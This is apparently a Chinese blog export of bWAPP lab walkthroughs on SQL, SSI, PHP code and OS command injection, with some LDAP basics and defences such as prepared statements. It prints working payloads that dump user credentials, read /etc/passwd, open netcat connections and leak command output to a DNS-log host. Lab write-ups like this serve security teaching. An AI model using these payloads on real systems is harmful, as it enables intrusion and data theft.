<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">http://192.168.80.2/sqli_2.php?movie=0+union+<span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(login,<span class="keyword">password</span>) <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span> <span class="comment">#</span></span><br></pre></td></tr></table></figure>

<h3 id="high"><a href="#high" class="headerlink" title="high"></a>high</h3><p>使用预处理防止sql注入</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">   $id = $_GET[<span class="string">"movie"</span>];</span><br><span class="line"></span><br><span class="line">   $sql = <span class="string">"SELECT title, release_year, genre, main_character, imdb FROM movies WHERE id =?"</span>;  </span><br><span class="line"><span class="comment">// ? 为占位符，等待接收的参数传入</span></span><br><span class="line">   <span class="keyword">if</span>($stmt = $link-&gt;prepare($sql)) </span><br><span class="line">   <span class="comment">// if($stmt = mysqli_prepare($link, $sql))                </span></span><br><span class="line">   &#123;</span><br><span class="line"></span><br><span class="line">       <span class="comment">// Binds the parameters for markers</span></span><br><span class="line">       $stmt-&gt;bind_param(<span class="string">"s"</span>, $id);</span><br><span class="line">       <span class="comment">// mysqli_stmt_bind_param($stmt, "s", $id);</span></span><br><span class="line"></span><br><span class="line">       <span class="comment">// Executes the query</span></span><br><span class="line">       $stmt-&gt;execute();</span><br><span class="line">       <span class="comment">// mysqli_stmt_execute($stmt);</span></span><br><span class="line"></span><br><span class="line">       <span class="comment">// Binds the result variables</span></span><br><span class="line">       $stmt-&gt;bind_result($title, $release_year, $genre, $main_character, $imdb);</span><br><span class="line">       <span class="comment">// mysqli_stmt_bind_result($stmt, $title, $release_year, $genre, $main_character, $imdb);</span></span><br><span class="line"></span><br><span class="line">       <span class="comment">// Stores the result, necessary to count the number of rows</span></span><br><span class="line">       $stmt-&gt;store_result();      </span><br><span class="line">       <span class="comment">// mysqli_stmt_store_result($stmt);</span></span><br><span class="line"></span><br><span class="line">       <span class="comment">// Prints the number of rows</span></span><br><span class="line">       <span class="comment">// printf("Number of rows: %d.\n", mysqli_stmt_num_rows($stmt));</span></span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p><a href="https://www.php.net/manual/zh/mysqli.prepare.php" target="_blank" rel="noopener">mysqli_prepare</a></p>
<p><a href="https://blog.csdn.net/tang_2214/article/details/80349557" target="_blank" rel="noopener">预编译防止sql注入</a></p>
]]></content>
  </entry>
  <entry>
    <title>bWAPP--SQL Injection</title>
    <url>/2020/09/19/bWAPP--SQL%20Injection/</url>
    <content><![CDATA[<h1 id="bWAPP-–-SQL-Injection-字符型Union-注入"><a href="#bWAPP-–-SQL-Injection-字符型Union-注入" class="headerlink" title="bWAPP – SQL Injection (字符型Union 注入)"></a>bWAPP – SQL Injection (字符型Union 注入)</h1><h2 id="注入基本流程"><a href="#注入基本流程" class="headerlink" title="注入基本流程"></a>注入基本流程</h2><ol>
<li><p>判断存在注入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; or 1&#x3D;1#</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/20200919211829826.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
</li>
<li><p>判断字段数量</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;  order by 8#&#96;</span><br><span class="line">#（报错）</span><br><span class="line"></span><br><span class="line">1&#39;  order by 7#</span><br><span class="line">#（正常回显，存在7个字段）</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/20200919211909721.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/2020091921193291.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
</li>
</ol>
<ol start="3">
<li><p>判断可注入字段位置</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;  union select 1,2,3,4,5,6,7 #</span><br></pre></td></tr></table></figure>

<p>（回显 2 3 5 4 字段可以替换）<br><img src="https://img-blog.csdnimg.cn/20200919212005563.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
</li>
</ol>
<ol start="4">
<li><p>使用内置函数查看数据库信息</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;  union select 1,database(),version(),user(),5,6,7  #</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200919212029765.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p><a href="https://dev.mysql.com/doc/refman/5.6/en/sql-function-reference.html" target="_blank" rel="noopener">mysql内置函数</a></p>
</li>
<li><p>查看表名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;  union select 1,database(),version(),user(),table_name,6,7 from information_schema.tables table_schema&#x3D;database() #</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/20200919212051755.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
</li>
</ol>
<ol start="6">
<li><p>获取表字段名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;  union select 1,database(),version(),table_name,column_name,6,7 from information_schema.columns where table_name&#x3D;&quot;users&quot; and table_schema&#x3D;database() #</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/20200919212110232.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
</li>
<li><p>提权相关信息</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;  union select 1,login,Password,email,secret,6,7 from users#</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200919212130995.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
</li>
</ol>
<h2 id="演练"><a href="#演练" class="headerlink" title="演练"></a>演练</h2><ul>
<li><p>low</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;  union select 1,login,Password,email,secret,6,7 from users#</span><br></pre></td></tr></table></figure>



</li>
</ul>
<ul>
<li><p>mid</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sqli_check_1</span><span class="params">($data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">return</span> addslashes($data);</span><br><span class="line">    <span class="comment">// 语法 addslashes ( string $str ) : string</span></span><br><span class="line">    <span class="comment">// 返回字符串，该字符串为了数据库查询语句等的需要在某些字符前加上了反斜线。</span></span><br><span class="line">    <span class="comment">// 这些字符是单引号（'）、双引号（"）、反斜线（\）与 NUL（NULL 字符）。</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><a href="https://blog.csdn.net/hee_mee/article/details/108553356" target="_blank" rel="noopener">addslashes注入方法</a></p>
</li>
<li><p>high</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sqli_check_3</span><span class="params">($link, $data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">return</span> mysqli_real_escape_string($link, $data);</span><br><span class="line">    <span class="comment">// 面向对象风格</span></span><br><span class="line">    <span class="comment">// mysqli::escape_string ( string $escapestr ) : string</span></span><br><span class="line">    <span class="comment">// mysqli::real_escape_string ( string $escapestr ) : string</span></span><br><span class="line">    <span class="comment">// 过程化风格</span></span><br><span class="line">    <span class="comment">// mysqli_real_escape_string ( mysqli $link , string $escapestr ) : string</span></span><br><span class="line">    <span class="comment">// 此函数用来对字符串中的特殊字符进行转义， 以使得这个字符串是一个合法的 SQL 语句。</span></span><br><span class="line">    <span class="comment">// 传入的字符串会根据当前连接的字符集进行转义，得到一个编码后的合法的 SQL 语句。</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



</li>
</ul>
<p><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet" target="_blank" rel="noopener">SQL injection 备忘清单</a></p>
]]></content>
  </entry>
  <entry>
    <title>bWAPP--SSI  Injection</title>
    <url>/2020/09/18/bWAPP--SSI%20%20Injection/</url>
    <content><![CDATA[<h1 id="bWAPP–SSI-Injection"><a href="#bWAPP–SSI-Injection" class="headerlink" title="bWAPP–SSI  Injection"></a>bWAPP–SSI  Injection</h1><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="什么是SSI"><a href="#什么是SSI" class="headerlink" title="什么是SSI"></a>什么是SSI</h3><p>SSI是英文Server Side Includes的缩写，翻译成中文就是<code>服务器端包含</code>的意思</p>
<p>apache和iis都可以通过配置支持SSI(默认Apache不开启SSI，SSI这种技术已经比较少用了)</p>
<h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><table>
<thead>
<tr>
<th>指令名称</th>
<th>参数列表</th>
</tr>
</thead>
<tbody><tr>
<td>config</td>
<td>errmsg, timefmt, sizefmt</td>
</tr>
<tr>
<td>include</td>
<td>virtual,file</td>
</tr>
<tr>
<td>echo</td>
<td>var</td>
</tr>
<tr>
<td>fsize</td>
<td>file</td>
</tr>
<tr>
<td>flastmod</td>
<td>file</td>
</tr>
<tr>
<td>exec</td>
<td>cmd, cgi</td>
</tr>
</tbody></table>
<ul>
<li><p>显示服务器端环境变量&lt;#echo&gt;</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#获取本文档名称：</span></span><br><span class="line">&lt;!–<span class="comment">#echo var="DOCUMENT_NAME"–&gt;</span></span><br><span class="line"><span class="comment">#获取当前时间：</span></span><br><span class="line">&lt;!–<span class="comment">#echo var="DATE_LOCAL"–&gt;</span></span><br><span class="line"><span class="comment">#获取当前IP：</span></span><br><span class="line">&lt;! <span class="comment">#echo var="REMOTE_ADDR"–&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>将文本内容直接插入到文档中&lt;#include&gt;</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#&lt;! #include file="文件名称"–&gt;</span></span><br><span class="line">&lt;!--<span class="comment">#include virtual="index.html" --&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#&lt;! #include virtual="文件名称"–&gt;</span></span><br><span class="line">&lt;!--<span class="comment">#include virtual="/www/footer.html" --&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>注：file包含文件可以在同一级目录或其子目录中，但不能在上一级目录中，virtual包含文件可以是Web站点上的虚拟目录的完整路径</strong></p>
</li>
<li><p>显示WEB文档相关信息&lt;#flastmod&gt;&lt;#fsize&gt;(如文件制作日期/大小等)</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#获取文件最近更新日期：</span></span><br><span class="line">&lt;! <span class="comment">#flastmod file="文件名称"–&gt;</span></span><br><span class="line"><span class="comment">#获取文件的长度：</span></span><br><span class="line">&lt;!–<span class="comment">#fsize file="文件名称"–&gt;</span></span><br></pre></td></tr></table></figure>



</li>
</ul>
<ul>
<li><p>直接执行服务器上的各种程序&lt;#exec&gt;(如CGI或其他可执行程序)</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#&lt;!–#exec cmd="文件名称"–&gt;</span></span><br><span class="line">&lt;!--<span class="comment">#exec cmd="cat /etc/passwd"--&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#&lt;!–#exec cgi="文件名称"–&gt;</span></span><br><span class="line">&lt;!--<span class="comment">#exec cgi="/cgi-bin/access_log.cgi"–&gt;</span></span><br></pre></td></tr></table></figure>

</li>
</ul>
<h2 id="注入条件"><a href="#注入条件" class="headerlink" title="注入条件"></a>注入条件</h2><p>  满足以下三个条件存在SSL注入：</p>
<ol>
<li>Web服务器支持SSI；</li>
<li>用户输入内容，返回在HTML页面中;</li>
<li>参数值未进行输入清理</li>
</ol>
<h2 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h2><p>  1、识别页面是否包含.stm,.shtm和.shtml后缀</p>
<p>  2、从业务场景来Fuzz，比如获取IP、定位、时间模块等</p>
<h2 id="SSI防御"><a href="#SSI防御" class="headerlink" title="SSI防御"></a>SSI防御</h2><ul>
<li>关闭服务器SSI功能</li>
<li>过滤相关SSI特殊字符（<code>&lt;,&gt;,#,-,&quot;,&#39;</code>）</li>
</ul>
<p><a href="https://www.cnblogs.com/endust/p/11826210.html" target="_blank" rel="noopener">SSI注入漏洞</a></p>
<p><a href="https://blog.csdn.net/qq_29277155/article/details/52751364" target="_blank" rel="noopener">SSI 注入的介绍和代码防御</a></p>
]]></content>
  </entry>
  <entry>
    <title>bWAPP--PHP Code Injection</title>
    <url>/2020/09/18/bWAPP--PHP%20Code%20Injection/</url>
    <content><![CDATA[<h1 id="bWAPP–PHP-Code-Injection"><a href="#bWAPP–PHP-Code-Injection" class="headerlink" title="bWAPP–PHP Code Injection"></a>bWAPP–PHP Code Injection</h1><p>​            </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_REQUEST[<span class="string">"message"</span>]))</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// If the security level is not MEDIUM or HIGH</span></span><br><span class="line">    <span class="keyword">if</span>($_COOKIE[<span class="string">"security_level"</span>] != <span class="string">"1"</span> &amp;&amp; $_COOKIE[<span class="string">"security_level"</span>] != <span class="string">"2"</span>)</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    &lt;p&gt;&lt;i&gt;<span class="meta">&lt;?php</span> @<span class="keyword">eval</span> (<span class="string">"echo "</span> . $_REQUEST[<span class="string">"message"</span>] . <span class="string">";"</span>);<span class="meta">?&gt;</span>&lt;/i&gt;&lt;/p&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>low</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/phpi.php?message=<span class="built_in">exec</span>(<span class="string">"nc 192.168.80.2 4444"</span>)</span><br></pre></td></tr></table></figure>



</li>
</ul>
<ul>
<li><p>mid/high</p>
<p>无法绕过</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// If the security level is MEDIUM or HIGH</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    &lt;p&gt;&lt;i&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> htmlspecialchars($_REQUEST[<span class="string">"message"</span>], ENT_QUOTES, <span class="string">"UTF-8"</span>);;<span class="meta">?&gt;</span>&lt;/i&gt;&lt;/p&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



</li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>bWAPP-os-command-Injection</title>
    <url>/2020/09/16/bWAPP-os-command-Injection/</url>
    <content><![CDATA[<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><h2 id="OS-command-注入"><a href="#OS-command-注入" class="headerlink" title="OS-command 注入"></a>OS-command 注入</h2><p>操作系统命令注入（也称为外壳程序注入）是一个Web安全漏洞，它使攻击者可以在运行应用程序的服务器上执行任意操作系统（OS）命令，并且通常会完全破坏该应用程序及其所有数据。攻击者通常可以利用OS命令注入漏洞来破坏托管基础结构的其他部分，利用信任关系将攻击转移到组织内的其他系统。</p>
<h2 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h2><h3 id="amp-或-或"><a href="#amp-或-或" class="headerlink" title="&amp; 或;或|"></a>&amp; 或;或|</h3><p>使用&amp;（; 或 | ）来进行多条命令的执行</p>
<h4 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">https://insecure-website.com/stockStatusproductID=381&amp;storeID=29</span><br></pre></td></tr></table></figure>

<p>对ID进行注入</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">https://insecure-website.com/stockStatus?productID=381&amp;storeID=&amp; echo aiwefwlguh &amp;</span><br></pre></td></tr></table></figure>

<p>假设此输入是通过productID参数提交的，则应用程序执行的命令为：</p>
<p>stockreport.pl &amp; echo aiwefwlguh &amp; 29</p>
<p>则得到输出</p>
<p>Error - productID was not provided<br>aiwefwlguh<br>29: command not found</p>
<p>输出的三行表明：</p>
<ul>
<li><code>stockreport.pl</code>执行 原始命令时没有预期的参数，因此返回了错误消息。</li>
<li><code>echo</code>执行 注入的命令，并在输出中回显提供的字符串。</li>
<li>原始参数<code>29</code>作为命令执行，从而导致错误</li>
</ul>
<h2 id="OS-command-盲注"><a href="#OS-command-盲注" class="headerlink" title="OS command 盲注"></a>OS command 盲注</h2><p>应用不会对注入进行响应，无法明显判断是否存在注入</p>
<h2 id="利用方法-1"><a href="#利用方法-1" class="headerlink" title="利用方法"></a>利用方法</h2><ul>
<li><h3 id="使用时间延迟检测盲注OS命令注入"><a href="#使用时间延迟检测盲注OS命令注入" class="headerlink" title="使用时间延迟检测盲注OS命令注入"></a>使用时间延迟检测盲注OS命令注入</h3></li>
</ul>
  <figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&amp; ping -c 10 127.0.0.1 &amp;</span><br></pre></td></tr></table></figure>

<p>  它使您可以指定要发送的ICMP数据包的数量，从而指定该命令运行所花费的时间,此命令将导致应用程序ping其环回网络适配器10秒钟。</p>
<ul>
<li><h3 id="通过重定向输出来利用盲目的OS命令注入-需要猜解系统目录"><a href="#通过重定向输出来利用盲目的OS命令注入-需要猜解系统目录" class="headerlink" title="通过重定向输出来利用盲目的OS命令注入(需要猜解系统目录)"></a>通过重定向输出来利用盲目的OS命令注入(需要猜解系统目录)</h3><p>您可以将注入命令的输出重定向到Web根目录下的文件中，然后可以使用浏览器进行检索。例如，如果应用程序从文件系统location提供静态资源<code>/var/www/static</code>，那么您可以提交以下输入：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&amp; whoami &gt; /var/www/static/whoami.txt &amp;</span><br></pre></td></tr></table></figure>

<p>的<code>&gt;</code>字符发送从所述输出<code>whoami</code>命令指定的文件。然后，您可以使用浏览器来获取<code>https://vulnerable-website.com/whoami.txt</code>文件，并查看注入命令的输出。</p>
</li>
<li><p>利用带外（<a href="https://portswigger.net/burp/application-security-testing/oast" target="_blank" rel="noopener">OAST</a>）技术利用盲目的OS命令注入</p>
<p><a href="http://ceye.io/" target="_blank" rel="noopener">在线站点</a></p>
<p><a href="https://www.t00ls.net/dnslog.html" target="_blank" rel="noopener">在线站点2</a></p>
<p><a href="https://github.com/BugScanTeam/DNSLog" target="_blank" rel="noopener">个人DNSLog搭建</a></p>
<p>您可以使用注入的命令，通过OAST技术触发与您控制的系统的带外网络交互。例如：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&amp; nslookup `whoami`.8rxxx.ceye.io &amp;</span><br></pre></td></tr></table></figure>

<p>此有效负载使用<code>nslookup</code>命令对指定的域进行DNS查找。攻击者可以监视是否发生了指定的查找，从而检测到命令已成功注入。</p>
</li>
</ul>
<ul>
<li><h2 id="注入OS命令的方式"><a href="#注入OS命令的方式" class="headerlink" title="注入OS命令的方式"></a>注入OS命令的方式</h2><p>许多字符用作命令分隔符，使命令可以链接在一起。以下命令分隔符在Windows和基于Unix的系统上均可使用：</p>
<ul>
<li><p><code>&amp;</code></p>
</li>
<li><p><code>&amp;&amp;</code></p>
</li>
<li><p><code>|</code></p>
</li>
<li><p><code>||</code></p>
</li>
</ul>
<p>以下命令分隔符仅在基于Unix的系统上工作：</p>
<ul>
<li><code>;</code></li>
<li>换行符（<code>0x0a</code>或<code>\n</code>）</li>
</ul>
<p>在基于Unix的系统上，您还可以使用反引号或美元字符在原始命令内对注入的命令执行内联执行：</p>
<ul>
<li><p>` 注入命令`</p>
</li>
<li><p><code>$(</code> 注入命令 <code>)</code></p>
</li>
</ul>
</li>
</ul>
<h2 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h2><p>永远不要从应用程序层代码中调用OS命令</p>
<p>如果认为无法避免使用用户提供的输入来调用OS命令，则必须执行强输入验证。有效验证的一些示例包括：</p>
<ul>
<li><p>根据允许值的白名单进行验证。</p>
</li>
<li><p>验证输入是否为数字。</p>
</li>
<li><p>验证输入仅包含字母数字字符，不包含其他语法或空格。</p>
</li>
</ul>
<p>把主机名超过50个字符的 DNS 请求作为识别 DNS 隧道的特征（正常的域名满足 Zipf 定律,而走 DNS 隧道的域名遵循的是随机分布）</p>
<p>通过检测单位时间内 DNS 报文流速率来检测是否存在DNS隧道，利用检测 txt 类型的 DNS 报文来发现僵尸网络的通信情况。Dns隧道通信一般常用的编码方式 Base64、Binary、Hex 编码等，请求的 Type 一般为 txt（为了返回的时候能够加入更多的信息）payload 部分一般为子域名</p>
<p><a href="https://portswigger.net/web-security/os-command-injection" target="_blank" rel="noopener">os-command-injection</a></p>
<p><a href="https://www.anquanke.com/post/id/107336" target="_blank" rel="noopener">利用/绕过 PHP escapeshellarg/escapeshellcmd函数</a></p>
<p><a href="https://www.freebuf.com/articles/web/201013.html" target="_blank" rel="noopener">带外注入（OOB）</a></p>
<h1 id="演练"><a href="#演练" class="headerlink" title="演练"></a>演练</h1><h2 id="OS-Command-Injection"><a href="#OS-Command-Injection" class="headerlink" title="OS Command Injection"></a>OS Command Injection</h2><ul>
<li><p>low </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www.nsa.gov;whoami</span><br><span class="line"><span class="comment">#www.nsa.gov&amp;whoami</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>mid</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www.nsa.gov | whoami</span><br></pre></td></tr></table></figure>



</li>
</ul>
<ul>
<li><p>high</p>
<p>​      commix （系统命令注入漏洞自动化测试工具）</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">commandi_check_2</span><span class="params">($data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">return</span> escapeshellcmd($data);</span><br><span class="line">    <span class="comment">// escapeshellcmd() 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 </span></span><br><span class="line">    <span class="comment">// 此函数保证用户输入的数据在传送到 exec() 或 system() 函数，或者 执行操作符 之前进行转义。</span></span><br><span class="line">    <span class="comment">//反斜线（\）会在以下字符之前插入： &amp;#;`|*?~&lt;&gt;^()[]&#123;&#125;$\, \x0A 和 \xFF。 ' 和 " 仅在不配对儿的时候被转义</span></span><br><span class="line">    <span class="comment">//在 Windows 平台上，所有这些字符以及 % 和 ! 字符都会被空格代替。   </span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// escapeshellarg</span></span><br><span class="line">    <span class="comment">// 1.确保用户只传递一个参数给命令</span></span><br><span class="line">    <span class="comment">// 2.用户不能指定更多的参数</span></span><br><span class="line">    <span class="comment">// 3.用户不能执行不同的命令</span></span><br><span class="line"><span class="comment">// escapeshellcmd</span></span><br><span class="line">    <span class="comment">// 1.确保用户只执行一个命令</span></span><br><span class="line">    <span class="comment">// 2.用户可以指定不限数量的参数</span></span><br><span class="line">    <span class="comment">// 3.用户不能执行不同的命令</span></span><br></pre></td></tr></table></figure>

</li>
</ul>
<h2 id="OS-Command-Injection-Blind"><a href="#OS-Command-Injection-Blind" class="headerlink" title="OS Command Injection Blind"></a>OS Command Injection Blind</h2><ul>
<li>low</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">127.0.0.1 &amp; ping -c 10 127.0.0.1 &amp;</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200916220242521.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>  外帶注入</p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">127.0.0.1 &amp; ping 8robx.ceye.io &amp;</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200916220217725.png#pic_center" alt="在这里插入图片描述"></p>
<ul>
<li><p>mid</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">127.0.0.1 | ping 8robx.ceye.io</span><br></pre></td></tr></table></figure>
</li>
<li><p>high</p>
<p>commix </p>
</li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>bWAPP-LDAP Injection</title>
    <url>/2020/09/16/bWAPP-LDAP%20Injection/</url>
    <content><![CDATA[<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><h2 id="什么是LDAP"><a href="#什么是LDAP" class="headerlink" title="什么是LDAP"></a>什么是LDAP</h2><p>LDAP(Lightweight Directory Access Protocol):轻量级目录访问协议，是一种在线目录访问协议，主要用于目录中资源的搜索和查询，是X.500的一种简便的实现。</p>
<p>LDAP有三种基本的通信机制：没有处理的匿名访问；基本的用户名、密码形式的认证；使用SASL、SSL的安全认证方式。</p>
<p>使用最广泛的LDAP服务如微软的ADAM(Active Directory Application Mode)和OpenLDAP。</p>
<p>默认端口389 加密端口636</p>
<h2 id="LDAP结构"><a href="#LDAP结构" class="headerlink" title="LDAP结构"></a>LDAP结构</h2><p>LDAP 目录是以树状的层次结构来存储数据<br><img src="https://img-blog.csdnimg.cn/20200913215046929.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>dn 表示一条记录所处的位置。<br>dc 表示一条记录所属的区域。<br>ou 代表一条记录所属的组织。<br>cn 表示一条记录的名字。<br>这些理解起来也很容易，LDAP 就好比我们程序用的关系型数据库，关系型数据库我们一般用数据库名称、表名、行来定位一条数据记录，而 LDAP 首先要说明是哪一棵树 (dc)，然后是从树根到目标所经过的所有分叉 (ou)，最后就是目标的名字 (cn)。</p>
<h2 id="LDAP语法"><a href="#LDAP语法" class="headerlink" title="LDAP语法"></a>LDAP语法</h2><p>= 等于的作用，例如查找 Name 等于 weiketang 的对象：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(Name=weiketang)</span><br></pre></td></tr></table></figure>
<p>&amp; 多条件满足查询，例如 Name 等于 weiketang 的，同时性别为男的，这里用 1 表示：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(&amp;(Name=weiketang)(sex=1))</span><br></pre></td></tr></table></figure>
<p>| 或查询，例如 Name 等于 weiketang，或性别为男的：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(!(Name=weiketang)(sex=1))</span><br></pre></td></tr></table></figure>
<p>! 非查询，用来排除对象，例如 Name 不等于 weiketang 的：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(!Name=weiketang)</span><br></pre></td></tr></table></figure>
<p>* 星号代表通配符，可表示任何内容，例如查询 Name 有内容的，相当于不为空，基本上是查询所有：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(Name=*)</span><br></pre></td></tr></table></figure>

